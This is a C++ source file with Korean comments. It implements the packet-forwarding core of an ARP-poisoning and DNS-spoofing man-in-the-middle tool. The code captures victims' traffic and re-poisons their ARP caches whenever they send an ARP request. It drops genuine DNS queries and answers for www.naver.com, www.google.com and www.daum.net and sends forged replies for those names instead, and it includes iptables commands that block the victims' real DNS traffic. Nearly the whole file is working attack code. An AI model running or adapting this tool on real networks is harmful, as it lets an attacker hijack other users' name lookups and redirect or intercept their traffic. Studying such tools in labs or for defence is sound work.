#include "packet_forwarder.hpp"
#include "dns_spoofer.hpp"
#include "arp_spoof.hpp"
#include "network_utils.hpp"
#include <iostream>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <chrono>
#include <cstdlib>
#include <sstream>
#include <cstring>

using namespace std;
using namespace chrono;
using namespace NetworkUtils;

#define DNS_PORT 53

// 스푸핑 대상 도메인 목록
const vector<string> SPOOF_DOMAINS = {
    "www.naver.com", 
    "www.google.com", 
    "www.daum.net"
};

PacketForwarder::PacketForwarder(pcap_t* handle, ArpSpoofer* spoofer, DnsSpoofer* dnsSpoofer)
    : handle(handle), spoofer(spoofer), dnsSpoofer(dnsSpoofer), running(false)
{
}

PacketForwarder::~PacketForwarder() 
{
    stop();
}

// iptable 규칙 (패킷 DROP 안될 경우 이용)
bool add_iptables_rules(const string& target_ip) 
{
    system("iptables -F FORWARD");
    system("echo 1 > /proc/sys/net/ipv4/ip_forward");
    // 서버로 보내는 패킷 차단
    string cmd1 = "iptables -A FORWARD -p udp -s " + target_ip + " --dport 53 -j DROP";
    int ret1 = system(cmd1.c_str());

    // Target으로 보내는 패킷 차단
    string cmd2 = "iptables -A FORWARD -p udp -d " + target_ip + " --sport 53 -j DROP";
    int ret2 = system(cmd2.c_str());
    system("iptables -A FORWARD -j ACCEPT");
    return (ret1 == 0 && ret2 == 0);
    // return (0);
}

void remove_iptables_rules() 
{
    system("iptables -F FORWARD");
    system("iptables -P FORWARD ACCEPT");
}

void PacketForwarder::start() 
{
    if (running) return;
    running = true;
    
    // iptable이 필요할 경우 아래 주석 해제
    // vector<string> target_ips;
    // for (const auto& target : spoofer->get_targets()) 
    // {
    //     target_ips.push_back(target->get_ip_str());
    //     if (add_iptables_rules(target->get_ip_str())) {
    //         cout << "DNS 차단 규칙 적용됨 - 대상: " << target->get_ip_str() << "\n";
    //     } else {
    //         cerr << "DNS 차단 규칙 적용 실패 - 대상: " << target->get_ip_str() << "\n";
    //     }
    // }
    
    forward_thread = make_unique<thread>(&PacketForwarder::forward_loop, this);
    cout << "패킷 포워딩 시스템 시작됨" << endl;
}

void PacketForwarder::stop() 
{
    if (!running) return;
    running = false;
    cv.notify_all();
    if (forward_thread && forward_thread->joinable())
        forward_thread->join();

    // iptable이 필요할 경우 해제로직도 추가로 주석 해제 필요
    // remove_iptables_rules();
    // cout << "iptables 규칙 제거됨" << endl;

    recover_dns();
    cout << "패킷 포워딩 시스템 종료됨" << endl;
}

void PacketForwarder::forward_loop() 
{
    struct pcap_pkthdr* header;
    const uint8_t* packet;
    int res;
    auto last_stat_time = high_resolution_clock::now();
    
    while (running) {
        res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) 
        {
            this_thread::sleep_for(chrono::microseconds(10));
            auto now = high_resolution_clock::now();
            if (duration_cast<seconds>(now - last_stat_time).count() >= 5)
                last_stat_time = now;
            continue;
        } 
        else if (res < 0) 
        {
            cerr << "패킷 캡처 오류: " << pcap_geterr(handle) << endl;
            break;
        }
        
        struct ether_header* eth = (struct ether_header*)packet;
        if (mac_equals(eth->ether_shost, spoofer->get_attacker_mac()))
            continue;
        
        if (ntohs(eth->ether_type) == ETHERTYPE_ARP)
            {
                handle_arp_packet(packet, header->len);
            }
        else if (ntohs(eth->ether_type) == ETHERTYPE_IP) {
            struct ip* ip_hdr = (struct ip*)(packet + sizeof(struct ether_header));
            if (ip_hdr->ip_p == IPPROTO_UDP) {
                int ip_header_len = ip_hdr->ip_hl * 4;
                struct udphdr* udp = (struct udphdr*)(packet + sizeof(struct ether_header) + ip_header_len);
                uint16_t src_port = ntohs(udp->uh_sport);
                uint16_t dst_port = ntohs(udp->uh_dport);
                
                if (handle_dns_packet(packet, header->len)) 
                {
                    continue; // 스푸핑 패킷 전송이 이루어졌으므로 원본 DNS 패킷은 드랍
                } 
                else 
                {
                    // 대상 도메인에 해당하지 않으므로, DNS 패킷을 정상적으로 포워딩.
                    forward_packet(packet, header->len);
                    continue;
                }
            }            
        }
    }
}

bool PacketForwarder::handle_dns_packet(const uint8_t* packet, size_t packet_len) 
{
    // Ethernet, IP, UDP 헤더 길이 계산
    struct ether_header* eth = (struct ether_header*)packet;
    struct ip* ip_hdr = (struct ip*)(packet + sizeof(struct ether_header));
    int ip_header_len = ip_hdr->ip_hl * 4;
    struct udphdr* udp = (struct udphdr*)(packet + sizeof(struct ether_header) + ip_header_len);
    uint16_t src_port = ntohs(udp->uh_sport);
    uint16_t dst_port = ntohs(udp->uh_dport);
    
    // DNS 데이터 위치 및 길이
    const uint8_t* dns_data = packet + sizeof(struct ether_header) + ip_header_len + sizeof(struct udphdr);
    size_t dns_data_len = packet_len - (sizeof(struct ether_header) + ip_header_len + sizeof(struct udphdr));
    
    // DNS 질문 섹션에서 도메인 이름 추출
    string domain = dnsSpoofer->extract_domain_name(dns_data, dns_data_len);
    if (domain.empty())
        return false;
    
    // 지정 도메인과 정확히 일치하는지 확인 (서브도메인 제외)
    bool matches = false;
    for (const auto& spoof_domain : SPOOF_DOMAINS) 
    {
        if (domain == spoof_domain) 
        {
            matches = true;
            break;
        }
    }
    
    if (!matches)
        return false; // 지정 도메인이 아니면 그대로 전달
    
    // 지정 도메일 경우, DNS 제작 요청 및 DROP
    if (dst_port == DNS_PORT) 
    {
        // 클라이언트에서 서버로 보내는 DNS 요청
        cout << "DNS 요청 감지: " << domain << "\n";
        uint8_t* packet_copy = new uint8_t[packet_len];
        memcpy(packet_copy, packet, packet_len);
        thread([this, packet_copy, packet_len, domain]() 
        {
            dnsSpoofer->send_spoof_response(handle, packet_copy, packet_len,
                                             spoofer->get_attacker_mac(),
                                             spoofer->get_gateway_ip(),
                                             domain,
                                             spoofer->get_targets());
            delete[] packet_copy;
        }).detach();

        cout << "DNS 요청 차단: " << domain << "\n";
        return true;
    } 
    else if (src_port == DNS_PORT) 
    {
        // 서버에서 클라이언트로 오는 정상 DNS 응답 (드랍)
        cout << "정상 DNS 응답 드랍: " << domain << "\n";
        return true;
    }
    
    return false;
}


void PacketForwarder::handle_arp_packet(const uint8_t* packet, size_t packet_len) 
{
    // ARP 패킷인지 확인
    const struct ether_header* eth = reinterpret_cast<const struct ether_header*>(packet);
    if (ntohs(eth->ether_type) != ETHERTYPE_ARP)
        return;
        
    // ARP 헤더 파싱 (ether_arp 사용)
    const struct ether_arp* arp = reinterpret_cast<const struct ether_arp*>(packet + sizeof(struct ether_header));
    uint16_t op = ntohs(arp->ea_hdr.ar_op);
    
    // ARP 요청인 경우만 처리 (ARPOP_REQUEST 값은 1)
    if (op == ARPOP_REQUEST) {
        for (const auto& target : spoofer->get_targets()) {
            // Target의 IP가 SPA OR TPA 있을 경우, ARP 전송 및 해당 PACKET DROP
            if (memcmp(arp->arp_spa, target->get_ip(), 4) == 0 ||
                memcmp(arp->arp_tpa, target->get_ip(), 4) == 0) {
                cout << "ARP 요청 감지: 대상 " << target->get_ip_str() 
                     << " 관련 ARP 요청 발견. 스푸핑 패킷 재전송.\n";
                spoofer->send_arp_spoofing_packet(target.get());
            }
        }
    }
}

bool PacketForwarder::is_spoofed_packet(const uint8_t* packet, size_t packet_len) 
{
    if (packet_len < sizeof(struct ether_header) + sizeof(struct ip))
        return false;
    struct ether_header* eth = (struct ether_header*)packet;
    if (ntohs(eth->ether_type) != ETHERTYPE_IP)
        return false;
    if (mac_equals(eth->ether_shost, spoofer->get_attacker_mac()))
        return false;
    
    struct ip* ip_hdr = (struct ip*)(packet + sizeof(struct ether_header));
    uint8_t src_ip[4], dst_ip[4];
    memcpy(src_ip, &ip_hdr->ip_src, 4);
    memcpy(dst_ip, &ip_hdr->ip_dst, 4);
    
    bool src_is_gateway = ip_equals(src_ip, spoofer->get_gateway_ip());
    bool dst_is_gateway = ip_equals(dst_ip, spoofer->get_gateway_ip());
    
    bool src_is_target = false, dst_is_target = false;
    for (const auto& target : spoofer->get_targets()) {
        if (ip_equals(src_ip, target->get_ip()))
            src_is_target = true;
        if (ip_equals(dst_ip, target->get_ip()))
            dst_is_target = true;
    }
    
    return (src_is_target && dst_is_gateway) || (src_is_gateway && dst_is_target);
}

void PacketForwarder::forward_packet(const uint8_t* packet, size_t packet_len) 
{
    uint8_t* new_packet = new uint8_t[packet_len];
    memcpy(new_packet, packet, packet_len);
    struct ether_header* eth = (struct ether_header*)new_packet;
    struct ip* ip_hdr = (struct ip*)(new_packet + sizeof(struct ether_header));
    uint8_t src_ip[4], dst_ip[4];
    memcpy(src_ip, &ip_hdr->ip_src, 4);
    memcpy(dst_ip, &ip_hdr->ip_dst, 4);
    
    if (ip_equals(src_ip, spoofer->get_gateway_ip())) {
        memcpy(eth->ether_shost, spoofer->get_attacker_mac(), 6);
        bool found_target = false;
        for (const auto& target : spoofer->get_targets()) {
            if (ip_equals(dst_ip, target->get_ip())) {
                memcpy(eth->ether_dhost, target->get_mac(), 6);
                found_target = true;
                break;
            }
        }
        if (!found_target) {
            delete[] new_packet;
            return;
        }
    } else {
        memcpy(eth->ether_shost, spoofer->get_attacker_mac(), 6);
        memcpy(eth->ether_dhost, spoofer->get_gateway_mac(), 6);
    }
    if (mac_equals(eth->ether_dhost, ZERO_MAC)) {
        cout << "목적지 MAC 주소가 설정되지 않음. 포워딩 취소\n";
        delete[] new_packet;
        return;
    }
    
    if (pcap_sendpacket(handle, new_packet, packet_len) != 0)
        cerr << "패킷 포워딩 실패: " << pcap_geterr(handle) << "\n";
    
    delete[] new_packet;
}

void PacketForwarder::recover_dns()
{
    cout << "DNS 스푸핑 복구 시작..." << endl;
    dnsSpoofer->send_recovery_responses(handle,
                                         spoofer->get_attacker_mac(),
                                         spoofer->get_gateway_ip(),
                                         spoofer->get_targets());
    cout << "DNS 스푸핑 복구 완료" << endl;
}
